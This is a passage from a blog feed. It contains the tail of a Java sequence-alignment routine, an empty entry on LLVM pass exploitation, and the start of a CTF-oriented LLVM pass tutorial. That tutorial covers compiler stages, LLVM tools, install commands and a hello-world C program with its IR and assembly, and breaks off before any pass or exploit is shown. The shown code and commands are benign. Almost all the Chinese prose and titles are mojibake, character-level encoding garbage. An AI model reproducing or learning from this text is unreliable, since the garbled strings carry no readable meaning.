class="hljs-type">int</span> zj3=d+optC[i][j-<span class="hljs-number">1</span>];<br>            <span class="hljs-keyword">if</span>(zj1&lt;zj2&amp;&amp;zj1&lt;zj3){<br>                aX=X.substring(i-<span class="hljs-number">1</span>,i)+aX;<br>                aY=Y.substring(j-<span class="hljs-number">1</span>,j)+aY;<br>                M[<span class="hljs-number">0</span>][mL]=i;<br>                M[<span class="hljs-number">1</span>][mL]=j;<br>                mL=mL+<span class="hljs-number">1</span>;<br>                i--;<br>                j--;<br>            }<br>            <span class="hljs-keyword">if</span>(zj2&lt;=zj1&amp;&amp;zj2&lt;=zj3){<br>                aY=<span class="hljs-string">"-"</span>+aY;<br>                aX=X.substring(i-<span class="hljs-number">1</span>,i)+aX;<br>                i=i-<span class="hljs-number">1</span>;<br>            }<br>            <span class="hljs-keyword">if</span>(zj3&lt;=zj1&amp;&amp;zj3&lt;=zj2){<br>                aX=<span class="hljs-string">"-"</span>+aX;<br>                aY=Y.substring(j-<span class="hljs-number">1</span>,j)+aY;<br>                j=j-<span class="hljs-number">1</span>;<br>            }<br>        }<br>    }<br>}<br></code></pre></td></tr></tbody></table></figure>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;ç®—æ³•ä¸ç¨‹åºè®¾è®¡å®éªŒ&quot;&gt;&lt;a href=&quot;#ç®—æ³•ä¸ç¨‹åºè®¾è®¡å®éªŒ&quot; class=&quot;headerlink&quot; title=&quot;ç®—æ³•ä¸ç¨‹åºè®¾è®¡å®éªŒ&quot;&gt;&lt;/a&gt;ç®—æ³•ä¸ç¨‹åºè®¾è®¡å®éªŒ&lt;/h1&gt;&lt;p&gt;è¦æ±‚&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;1.å¤ç°ä»£ç ï¼Œå†™ä¸Šè‡ªå·±çš„æ³¨é‡Š&lt;/p&gt;
</summary>
      
    
    
    
    <category term="ç®—æ³•ä¸ç¨‹åºè®¾è®¡" scheme="https://kylinxin.github.io/categories/%E7%AE%97%E6%B3%95%E4%B8%8E%E7%A8%8B%E5%BA%8F%E8%AE%BE%E8%AE%A1/"/>
    
    
    <category term="ç®—æ³•ä¸ç¨‹åºè®¾è®¡å®éªŒ" scheme="https://kylinxin.github.io/tags/%E7%AE%97%E6%B3%95%E4%B8%8E%E7%A8%8B%E5%BA%8F%E8%AE%BE%E8%AE%A1%E5%AE%9E%E9%AA%8C/"/>
    
  </entry>
  
  <entry>
    <title>LLVM PASS PWNï¼ˆäºŒï¼‰</title>
    <link href="https://kylinxin.github.io/2023/10/28/LLVM%20PASS%20PWN%20(%E4%BA%8C)/"/>
    <id>https://kylinxin.github.io/2023/10/28/LLVM%20PASS%20PWN%20(%E4%BA%8C)/</id>
    <published>2023-10-28T15:14:29.000Z</published>
    <updated>2023-10-28T15:02:55.367Z</updated>
    
    <content type="html"><![CDATA[<h1 id="LLVM-PASS-PWNï¼ˆäºŒï¼‰"><a href="#LLVM-PASS-PWNï¼ˆäºŒï¼‰" class="headerlink" title="LLVM PASS PWNï¼ˆäºŒï¼‰"></a>LLVM PASS PWNï¼ˆäºŒï¼‰</h1><h2 id=""><a href="#" class="headerlink" title=""></a></h2>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;LLVM-PASS-PWNï¼ˆäºŒï¼‰&quot;&gt;&lt;a href=&quot;#LLVM-PASS-PWNï¼ˆäºŒï¼‰&quot; class=&quot;headerlink&quot; title=&quot;LLVM PASS PWNï¼ˆäºŒï¼‰&quot;&gt;&lt;/a&gt;LLVM PASS PWNï¼ˆäºŒï¼‰&lt;/h1&gt;&lt;h2 id=&quot;&quot;&gt;&lt;a href</summary>
      
    
    
    
    <category term="LLVM PASS PWN" scheme="https://kylinxin.github.io/categories/LLVM-PASS-PWN/"/>
    
    
    <category term="LLVM PASS PWNï¼ˆäºŒï¼‰" scheme="https://kylinxin.github.io/tags/LLVM-PASS-PWN%EF%BC%88%E4%BA%8C%EF%BC%89/"/>
    
  </entry>
  
  <entry>
    <title>LLVM PASS PWNï¼ˆä¸€ï¼‰</title>
    <link href="https://kylinxin.github.io/2023/10/28/LLVM%20PASS%20PWN%EF%BC%88%E4%B8%80%EF%BC%89/"/>
    <id>https://kylinxin.github.io/2023/10/28/LLVM%20PASS%20PWN%EF%BC%88%E4%B8%80%EF%BC%89/</id>
    <published>2023-10-28T15:14:29.000Z</published>
    <updated>2023-10-28T14:56:33.522Z</updated>
    
    <content type="html"><![CDATA[<h1 id="LLVM-PASS-PWNï¼ˆä¸€ï¼‰"><a href="#LLVM-PASS-PWNï¼ˆä¸€ï¼‰" class="headerlink" title="LLVM PASS PWNï¼ˆä¸€ï¼‰"></a>LLVM PASS PWNï¼ˆä¸€ï¼‰</h1><h2 id="å‰ç½®çŸ¥è¯†ç®€è¿°"><a href="#å‰ç½®çŸ¥è¯†ç®€è¿°" class="headerlink" title="å‰ç½®çŸ¥è¯†ç®€è¿°"></a>å‰ç½®çŸ¥è¯†ç®€è¿°</h2><h3 id="ä¸ºä»€ä¹ˆè¦ç¼–è¯‘ç¨‹åº"><a href="#ä¸ºä»€ä¹ˆè¦ç¼–è¯‘ç¨‹åº" class="headerlink" title="ä¸ºä»€ä¹ˆè¦ç¼–è¯‘ç¨‹åº"></a>ä¸ºä»€ä¹ˆè¦ç¼–è¯‘ç¨‹åº</h3><p>æœºå™¨è¯­è¨€æ˜¯ç”¨1å’Œ0ç»„æˆçš„ä»£ç ï¼Œä½†æœºå™¨æ˜¯è¯†åˆ«ä¸äº†1å’Œ0çš„ï¼Œæ›´å…·ä½“çš„æ˜¯å¦‚ä½•è¯†åˆ«çš„å‘¢ï¼Ÿå¯¹æœºå™¨ç”µè·¯è¿›è¡Œè®¾è®¡ä¹‹åï¼Œæœºå™¨èƒ½è¯†åˆ«é«˜ç”µå¹³è¿˜æ˜¯ä½ç”µå¹³ï¼Œåˆšå¥½ä¸2è¿›åˆ¶å¾ˆç›¸ä¼¼ï¼Œæƒ³è¾“å…¥0å°±ç»™æœºå™¨è¾“å…¥ä½ç”µå¹³ï¼Œæƒ³è¾“å…¥1ï¼Œå°±ç»™æœºå™¨è¾“å…¥é«˜ç”µå¹³ï¼Œæ‰€ä»¥å°±çœ‹åˆ°äº†1å’Œ0çš„è¡¨ç¤ºå½¢å¼</p><p>æœºå™¨è¯­è¨€å®ƒæ˜¯è®¡ç®—æœºå”¯ä¸€èƒ½è¯†åˆ«å’Œæ‰§è¡Œçš„è¯­è¨€ï¼Œä½†å®ƒçš„ç›´è§‚æ€§å·®ï¼Œå¯è¯»æ€§å·®ï¼Œæ¯”å¦‚ä¸€ä¸²<code>11110000111100001111</code>æœºå™¨å¯ä»¥å¿«é€Ÿè¯†åˆ«æ˜¯ä»€ä¹ˆä½†æ˜¯æˆ‘ä»¬å¾ˆéš¾ç†è§£ï¼Œå†æ¯”å¦‚æˆ‘ä»¬æƒ³è¦åœ¨å±å¹•ä¸Šè¾“å‡ºhello worldé‚£æˆ‘ä»¬è¯¥å¦‚ä½•ç”¨äºŒè¿›åˆ¶æ¥è¡¨ç¤ºå‘¢ï¼Œæ‰€ä»¥æ±‡ç¼–è¯­è¨€å°±è¯ç”Ÿäº†</p><p>æ±‡ç¼–è¯­è¨€ç”¨åŠ©è®°ç¬¦æ¥è¡¨ç¤ºæœºå™¨æŒ‡ä»¤ä¸­çš„æ“ä½œç å’Œæ“ä½œæ•°çš„æŒ‡ä»¤ç³»ç»Ÿï¼Œå¦‚a = 1ï¼Œæˆ‘ä»¬ä¸éœ€è¦å»ç”¨äºŒè¿›åˆ¶æ¥ç†è§£ï¼Œæˆ‘ä»¬å®Œå…¨å¯ä»¥åˆ©ç”¨mov a, 1è¿›è¡Œç†è§£ï¼Œé‚£æœ‰æ²¡æœ‰æ›´ç®€å•çš„æ–¹æ³•å‘¢ï¼Œæ¯”å¦‚ç°åœ¨è¦è¾“å‡ºhello wroldï¼Œè¿˜æ˜¯éœ€è¦åå‡ è¡Œçš„æ±‡ç¼–ä»£ç çš„ï¼Œæ‰€ä»¥é«˜çº§è¯­è¨€å°±è¯ç”Ÿäº†</p><p>é«˜çº§è¯­è¨€æ˜¯ä¸€ç§æ›´æ¥è¿‘äººç±»çš„è‡ªç„¶è¯­è¨€å’Œæ•°å­¦è¯­è¨€çš„è¯­è¨€ï¼Œæ¯”å¦‚æƒ³è¦a = 1ï¼Œå¾ˆç›´è§‚å°±æ˜¯a = 1ï¼Œåœ¨å¾ˆå¤§ç¨‹åº¦ä¸Šå‡å°‘ç¼–ç¨‹äººå‘˜çš„ç¼–å†™é‡</p><p>ä½†æ˜¯é—®é¢˜æ¥äº†ï¼Œæœºå™¨åªæ‡‚0å’Œ1é‚£æ€ä¹ˆæ‰èƒ½è®©é«˜çº§è¯­è¨€è¢«æœºå™¨è¯†åˆ«ï¼Œæ‰€ä»¥å°±æœ‰äº†ç¼–è¯‘ï¼Œå°†é«˜çº§è¯­è¨€ï¼ˆæºè¯­è¨€ï¼‰ç¿»è¯‘æˆæ±‡ç¼–è¯­è¨€æˆ–æœºå™¨è¯­è¨€ï¼ˆç›®æ ‡è¯­è¨€ï¼‰ï¼Œç¼–è¯‘çš„æ ¹æœ¬ç›®çš„å°±æ˜¯æŠŠæºä»£ç å˜æˆç›®æ ‡ä»£ç </p><h3 id="ç¼–è¯‘çš„è¿‡ç¨‹æ˜¯ä»€ä¹ˆ"><a href="#ç¼–è¯‘çš„è¿‡ç¨‹æ˜¯ä»€ä¹ˆ" class="headerlink" title="ç¼–è¯‘çš„è¿‡ç¨‹æ˜¯ä»€ä¹ˆ"></a>ç¼–è¯‘çš„è¿‡ç¨‹æ˜¯ä»€ä¹ˆ</h3><p>ç¼–è¯‘è¿‡ç¨‹ä¸»è¦å¯ä»¥åˆ’åˆ†ä¸ºå‰ç«¯ä¸åç«¯ï¼Œç¬”è€…ç”¨ä¸€å¼ å›¾ç®€è¿°ä¸€ä¸‹</p><p class='item-img' data-src='https://s2.loli.net/2023/10/28/UiPnzvrVDGfkLhm.png'><img src="https://s2.loli.net/2023/10/28/UiPnzvrVDGfkLhm.png" alt="image.png"></p><p>å‰ç«¯æŠŠæºä»£ç ç¿»è¯‘æˆIRï¼Œåç«¯æŠŠIRç¼–è¯‘æˆç›®æ ‡å¹³å°çš„æœºå™¨ç ï¼Œè¿™é‡Œç¬”è€…åœ¨æŸ¥é˜…èµ„æ–™çš„æ—¶å€™å‘ç°æœ‰äº›ä¼šå°†ç”Ÿæˆä¸­é—´ä»£ç æ”¾å…¥å‰ç«¯ï¼Œè€Œæœ‰äº›èµ„æ–™ä¼šå°†ç”Ÿæˆä¸­é—´ä»£ç æ”¾å…¥åç«¯</p><p>åœ¨è¯æ³•åˆ†æä¸­ç¼–è¯‘å™¨è¯»å…¥æºä»£ç ï¼Œç»è¿‡è¯æ³•åˆ†æå™¨è¯†åˆ«å‡ºTokenï¼Œæ¯”å¦‚è¯æ³•åˆ†æå™¨ä¸­è¯†åˆ«å‡ºçš„Tokenå¯ä»¥æ˜¯<code>int, return, {, }</code>ç­‰</p><p>åœ¨è¯­æ³•åˆ†æä¸­ä¼šæŠŠä¸Šé¢çš„Tokenä¸²ç»™è½¬æ¢æˆä¸€ä¸ªæŠ½è±¡è¯­æ³•æ ‘ASTï¼ŒASTæ ‘åæ˜ äº†ç¨‹åºçš„è¯­æ³•ç»“æ„</p><p>åœ¨è¯­ä¹‰åˆ†æä¸­éœ€è¦åšçš„ä»»åŠ¡æ˜¯ç†è§£è¯­ä¹‰ï¼Œè¯­å¥è¦åšä»€ä¹ˆï¼Œå¦‚foræ˜¯éœ€è¦å»å®ç°å¾ªç¯ï¼Œifæ˜¯åˆ¤æ–­ç­‰</p><p>åœ¨å‰ç«¯å®Œæˆä¹‹åï¼Œä¼šç”Ÿæˆä¸­é—´ä»£ç ï¼Œç»Ÿä¸€ä¼˜åŒ–ä¸­é—´ä»£ç ï¼Œå†å»å°†ä¸­é—´ä»£ç ç”Ÿæˆç›®æ ‡ä»£ç </p><p>å‰ç½®çŸ¥è¯†è¿™é‡Œç¬”è€…ç®€è¿°äº†ä¸€ä¸‹ï¼Œå…·ä½“çš„å¯ä»¥ç§»æ­¥ç¼–è¯‘åŸç†</p><ul><li><h2 id="LLVM"><a href="#LLVM" class="headerlink" title="LLVM"></a>LLVM</h2><h3 id="LLVM-IR-amp-LLVM-Pass"><a href="#LLVM-IR-amp-LLVM-Pass" class="headerlink" title="LLVM IR &amp; LLVM Pass"></a>LLVM IR &amp; LLVM Pass</h3><p><code>gcc</code>è¿™ä¸ªæœ€ç»å…¸çš„ç¼–è¯‘å™¨æä¾›çš„æ˜¯ä¸€æ•´å¥—æœåŠ¡ï¼Œå‰ç«¯å’Œåç«¯è€¦åˆåœ¨äº†ä¸€èµ·ï¼Œå¯¼è‡´äº†å¦‚æœä¸€ä¸ªæ–°çš„ç¼–ç¨‹è¯­è¨€å‡ºç°å¯èƒ½éœ€è¦è®¾è®¡ä¸€ä¸ªæ–°çš„IRä»¥åŠå®ç°è¿™ä¸ªIRçš„åç«¯ï¼Œå¦‚æœå‡ºç°äº†ä¸€ä¸ªæ–°çš„å¹³å°å°±è¦å®ç°ä¸€ä¸ªä»è‡ªå·±çš„IRåˆ°æ–°å¹³å°çš„åç«¯ï¼Œé’ˆå¯¹æ­¤ç±»é—®é¢˜å°±å‡ºç°äº†LLVM</p><p>ä¸åŒçš„å‰åç«¯ä½¿ç”¨ç»Ÿä¸€çš„ä¸­é—´ä»£ç ï¼Œè¿™æ ·ä¸€ä¸ªæ–°çš„ç¼–ç¨‹è¯­è¨€å‡ºç°åªéœ€è¦å®ç°ä¸€ä¸ªæ–°çš„å‰ç«¯ï¼Œå¦‚æœå‡ºç°äº†ä¸€ä¸ªæ–°çš„å¹³å°åªéœ€è¦å®ç°ä¸€ä¸ªæ–°çš„åç«¯</p><p>LLVM IRæœ‰ä¸‰ç§è¡¨ç¤ºå½¢å¼</p><ul><li>å¯è¯»IRï¼Œç±»ä¼¼æ±‡ç¼–ä»£ç ï¼Œå¯ä»¥ç»™äººçœ‹çš„ï¼Œåç¼€<code>.ll</code></li><li>ä¸å¯è¯»äºŒè¿›åˆ¶IRï¼Œåç¼€<code>.bc</code></li><li>ä¿å­˜åœ¨å†…å­˜ä¸­ï¼Œå†…å­˜æ ¼å¼</li></ul><p>LLVM Pass æ˜¯ä¸€ä¸ªæ¡†æ¶è®¾è®¡ï¼Œæ˜¯LLVMç³»ç»Ÿé‡Œé‡è¦çš„ç»„æˆéƒ¨åˆ†ï¼Œå› ä¸ºLLVM Passè´Ÿè´£LLVMç¼–è¯‘å™¨ç»å¤§éƒ¨åˆ†çš„å·¥ä½œï¼Œä¸€ç³»åˆ—çš„Passç»„åˆï¼Œæ„å»ºäº†ç¼–è¯‘å™¨çš„è½¬æ¢å’Œä¼˜åŒ–éƒ¨åˆ†ï¼ŒæŠ½è±¡æˆç»“æ„åŒ–çš„ç¼–è¯‘å™¨ä»£ç ã€‚</p><p>åœ¨å®ç°ä¸Šï¼ŒLLVMçš„æ ¸å¿ƒåº“ä¸­ä¼šç»™ä½ ä¸€äº› Passç±» å»ç»§æ‰¿ã€‚ä½ éœ€è¦å®ç°å®ƒçš„ä¸€äº›æ–¹æ³•ã€‚ æœ€åä½¿ç”¨LLVMçš„ç¼–è¯‘å™¨ä¼šæŠŠå®ƒç¿»è¯‘å¾—åˆ°çš„IRä¼ å…¥Passé‡Œï¼Œç»™ä½ éå†å’Œä¿®æ”¹ã€‚</p><p>LLVM Passçš„ç”¨å¤„æ˜¯æ’æ¡©ï¼Œæœºå™¨æ— å…³çš„ä»£ç ä¼˜åŒ–ï¼Œé™æ€åˆ†æï¼Œä»£ç æ··æ·†ç­‰</p><h3 id="LLVM-å·¥å…·"><a href="#LLVM-å·¥å…·" class="headerlink" title="LLVM å·¥å…·"></a>LLVM å·¥å…·</h3><p>ä»¥ä¸‹å†…å®¹æ¥è‡ª<a href="https://zhuanlan.zhihu.com/p/122522485">LLVM Passå…¥é—¨å¯¼å¼•</a></p><ul><li><code>llvm-as</code>ï¼šæŠŠLLVM IRä»äººç±»èƒ½çœ‹æ‡‚çš„æ–‡æœ¬æ ¼å¼æ±‡ç¼–æˆäºŒè¿›åˆ¶æ ¼å¼ã€‚æ³¨æ„ï¼šæ­¤å¤„å¾—åˆ°çš„<strong>ä¸æ˜¯</strong>ç›®æ ‡å¹³å°çš„æœºå™¨ç ã€‚</li><li><code>llvm-dis</code>ï¼š<code>llvm-as</code>çš„é€†è¿‡ç¨‹ï¼Œå³åæ±‡ç¼–ã€‚ ä¸è¿‡è¿™é‡Œçš„åæ±‡ç¼–çš„å¯¹è±¡æ˜¯LLVM IRçš„äºŒè¿›åˆ¶æ ¼å¼ï¼Œè€Œä¸æ˜¯æœºå™¨ç ã€‚</li><li><code>opt</code>ï¼šä¼˜åŒ–LLVM IRã€‚è¾“å‡ºæ–°çš„LLVM IRã€‚</li><li><code>llc</code>ï¼šæŠŠLLVM IRç¼–è¯‘æˆæ±‡ç¼–ç ã€‚éœ€è¦ç”¨<code>as</code>è¿›ä¸€æ­¥å¾—åˆ°æœºå™¨ç ã€‚</li><li><code>lli</code>ï¼šè§£é‡Šæ‰§è¡ŒLLVM IRã€‚</li></ul><h2 id="Clang"><a href="#Clang" class="headerlink" title="Clang"></a>Clang</h2><p>Clang æ˜¯ LLVM çš„å‰ç«¯ï¼Œå¯ä»¥ç”¨æ¥ç¼–è¯‘ Cï¼ŒC++ï¼ŒObjectiveC ç­‰è¯­è¨€ã€‚Clang çš„åŠŸèƒ½åŒ…æ‹¬ï¼šè¯æ³•åˆ†æã€è¯­æ³•åˆ†æã€è¯­ä¹‰åˆ†æã€ç”Ÿæˆä¸­é—´ä¸­é—´ä»£ç LLVM Intermediate Representation (LLVM IR)ã€‚</p><h2 id="LLVM-amp-Clangç¯å¢ƒå®‰è£…-amp-å·¥å…·æµ‹è¯•"><a href="#LLVM-amp-Clangç¯å¢ƒå®‰è£…-amp-å·¥å…·æµ‹è¯•" class="headerlink" title="LLVM &amp; Clangç¯å¢ƒå®‰è£… &amp; å·¥å…·æµ‹è¯•"></a>LLVM &amp; Clangç¯å¢ƒå®‰è£… &amp; å·¥å…·æµ‹è¯•</h2><p>ubuntu20.04ä¸‹å®‰è£…LLVM + Clangå¦‚ä¸‹</p><blockquote><p>sudo apt install clang-12</p><p>sudo apt install clang-8</p><p>sudo apt install llvm-12</p><p>sudo apt install llvm-8</p></blockquote><p>llvm-12å®‰è£…ä¹‹åå¯ä»¥ä½¿ç”¨opt-12ï¼Œä»Šå¹´çš„ciscnçš„LLVM PASS PWNå°±æ˜¯opt-12ï¼Œä¸€èˆ¬é¢˜ç›®éƒ½ä¼šç»™å‡ºoptçš„ç‰ˆæœ¬ã€‚ubuntu20.04åº”è¯¥è‡ªå¸¦opt-10å¦‚æœæ²¡æœ‰çš„è¯ï¼Œ<code>sudo apt install clang-10 &amp;&amp; sudo apt install llvm-10</code></p><p>ä¸Šé¢çš„åšé¢˜ç¯å¢ƒéƒ½å®‰è£…å®Œæˆä¹‹åï¼Œå…ˆå†™ä¸€ä¸ªcæ–‡ä»¶ï¼Œåˆ©ç”¨Clangå°†cæ–‡ä»¶ç¼–è¯‘æˆ<code>.ll, .bc</code>ç­‰æ ¼å¼çœ‹ä¸€ä¸‹æ˜¯å¦æ˜¯å¦‚ä¸Šæ‰€è¯´ï¼Œcæ–‡ä»¶å¦‚ä¸‹</p><figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;unistd.h&gt;</span></span><br><br><span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">(<span class="hljs-type">int</span> argc, <span class="hljs-type">char</span> **argv)</span>{<br>    <span class="hljs-type">char</span> name[<span class="hljs-number">0x20</span>];<br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">"hello world"</span>);<br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">"plz input your name"</span>);<br>    read(<span class="hljs-number">0</span>, name, <span class="hljs-number">0x1F</span>);<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">"biubiubiu"</span>);<br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>}<br></code></pre></td></tr></tbody></table></figure><p>é¦–å…ˆæ˜¯<code>.c-&gt;.ll</code>ï¼Œ<code>clang-12 -emit-llvm -S test.c -o test.ll</code>ï¼Œtest.ll(ç”Ÿæˆçš„IRæ–‡æœ¬æ–‡ä»¶)å¦‚ä¸‹</p><figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><code class="hljs asm">; ModuleID = 'test.c'<br>source_filename = "test.c"<br>target datalayout = "e-m:e-p270:32:32-p271:32:32-p272:64:64-i64:64-f80:128-n8:16:32:64-S128"<br>target triple = "x86_64-pc-linux-gnu"<br><br>@.str = private unnamed_addr constant [12 x i8] c"hello world\00", align 1<br>@.str.1 = private unnamed_addr constant [20 x i8] c"plz input your name\00", align 1<br>@.str.2 = private unnamed_addr constant [10 x i8] c"biubiubiu\00", align 1<br><br>; Function Attrs: noinline nounwind optnone uwtable<br>define dso_local i32 @main(i32 %0, i8** %1) #0 {<br>  %3 = alloca i32, align 4<br>  %4 = alloca i32, align 4<br>  %5 = alloca i8**, align 8<br>  %6 = alloca [32 x i8], align 16<br>  store i32 0, i32* %3, align 4<br>  store i32 %0, i32* %4, align 4<br>  store i8** %1, i8*** %5, align 8<br>  %7 = call i32 @puts(i8* getelementptr inbounds ([12 x i8], [12 x i8]* @.str, i64 0, i64 0))<br>  %8 = call i32 @puts(i8* getelementptr inbounds ([20 x i8], [20 x i8]* @.str.1, i64 0, i64 0))<br>  %9 = getelementptr inbounds [32 x i8], [32 x i8]* %6, i64 0, i64 0<br>  %10 = call i64 @read(i32 0, i8* %9, i64 31)<br>  %11 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([10 x i8], [10 x i8]* @.str.2, i64 0, i64 0))<br>  ret i32 0<br>}<br><br>declare dso_local i32 @puts(i8*) #1<br><br>declare dso_local i64 @read(i32, i8*, i64) #1<br><br>declare dso_local i32 @printf(i8*, ...) #1<br><br>attributes #0 = { noinline nounwind optnone uwtable "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "min-legal-vector-width"="0" "no-infs-fp-math"="false" "no-jump-tables"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="true" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "tune-cpu"="generic" "unsafe-fp-math"="false" "use-soft-float"="false" }<br>attributes #1 = { "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="true" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "tune-cpu"="generic" "unsafe-fp-math"="false" "use-soft-float"="false" }<br><br>!llvm.module.flags = !{!0}<br>!llvm.ident = !{!1}<br><br>!0 = !{i32 1, !"wchar_size", i32 4}<br>!1 = !{!"Ubuntu clang version 12.0.0-3ubuntu1~20.04.5"}<br></code></pre></td></tr></tbody></table></figure><p>ä¸Šé¢çš„IRå¾ˆç›´è§‚ï¼Œä¹‹å‰æåˆ°LLVM PASSçš„ä¸€ä¸ªç”¨å¤„æ˜¯ä¼˜åŒ–IRä»£ç ï¼Œä¼šå°†ä¸Šé¢çš„å¯ä»¥ä¼˜åŒ–çš„è¿›è¡Œä¼˜åŒ–</p><p>å…¶æ¬¡æ˜¯<code>.c-&gt;.bc</code>ï¼Œ<code>clang-12 -emit-llvm -c test.c -o test.bc</code>ï¼Œbcæ˜¯ä¸å¯è¯»äºŒè¿›åˆ¶</p><p><a href="https://xzfile.aliyuncs.com/media/upload/picture/20221014183446-d2d19954-4bab-1.png" class='item-img' data-src='https://xzfile.aliyuncs.com/media/upload/picture/20221014183446-d2d19954-4bab-1.png'><img src="https://xzfile.aliyuncs.com/media/upload/picture/20221014183446-d2d19954-4bab-1.png" alt="img"></a></p><p>ç„¶åæ˜¯<code>.ll -&gt; .bc</code>ï¼Œ<code>llvm-as test.ll -o test.bc</code>ï¼Œç»“æœå’Œä¸Šé¢çš„ä¸€æ ·</p><p>æ¥ç€æ˜¯<code>.bc - &gt; .ll</code>ï¼Œ<code>llvm-dis test.bc -o test.ll</code>ï¼ŒåŒä¸Š</p><p>æœ€åè¿˜æœ‰ä¸€ä¸ª<code>.bc -&gt; .s</code>ï¼Œ <code>llc test.bc -o test.s</code>ï¼Œå°†å­—èŠ‚ç çš„äºŒè¿›åˆ¶æ ¼å¼æ–‡ä»¶è½¬æ¢ä¸ºæœ¬åœ°çš„æ±‡ç¼–æ–‡ä»¶</p><figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br></pre></td><td class="code"><pre><code class="hljs asm">.text<br>    .file   "test.c"<br>    .globl  main                    # -- Begin function main<br>    .p2align    4, 0x90<br>    .type   main,@function<br>main:                                   # @main<br>    .cfi_startproc<br># %bb.0:<br>    pushq   %rbp<br>    .cfi_def_cfa_offset 16<br>    .cfi_offset %rbp, -16<br>    movq    %rsp, %rbp<br>    .cfi_def_cfa_register %rbp<br>    subq    $48, %rsp<br>    movl    $0, -8(%rbp)<br>    movl    %edi, -4(%rbp)<br>    movq    %rsi, -16(%rbp)<br>    movabsq $.L.str, %rdi<br>    callq   puts<br>    movabsq $.L.str.1, %rdi<br>    callq   puts<br>    leaq    -48(%rbp), %rsi<br>    xorl    %edi, %edi<br>    movl    $31, %edx<br>    callq   read<br>    movabsq $.L.str.2, %rdi<br>    movb    $0, %al<br>    callq   printf<br>    xorl    %eax, %eax<br>    addq    $48, %rsp<br>    popq    %rbp<br>    .cfi_def_cfa %rsp, 8<br>    retq<br>.Lfunc_end0:<br>    .size   main, .Lfunc_end0-main<br>    .cfi_endproc<br>                                        # -- End function<br>    .type   .L.str,@object          # @.str<br>    .section    .rodata.str1.1,"aMS",@progbits,1<br>.L.str:<br>    .asciz  "hello world"<br>    .size   .L.str, 12<br><br>    .type   .L.str.1,@object        # @.str.1<br>.L.str.1:<br>    .asciz  "plz input your name"<br>    .size   .L.str.1, 20<br><br>    .type   .L.str.2,@object        # @.str.2<br>.L.str.2:<br>    .asciz  "biubiubiu"<br>    .size   .L.str.2, 10<br><br>    .ident  "Ubuntu clang version 12.0.0-3ubuntu1~20.04.5"<br>    .section    ".note.GNU-stack","",@progbits<br></code></pre></td></tr></tbody></table></figure><h2 id="ç¼–å†™ç¬¬ä¸€ä¸ªLLVM-Pass"><a href="#ç¼–å†™ç¬¬ä¸€ä¸ªLLVM-Pass" class="headerlink" title="ç¼–å†™ç¬¬ä¸€ä¸ªLLVM Pass"></a>ç¼–å†™ç¬¬ä¸€ä¸ªLLVM Pass</h2><p>é€šè¿‡å‰é¢çš„çŸ¥è¯†ä¹‹åï¼Œç°åœ¨å¯ä»¥å°è¯•ç¼–å†™â€œhello 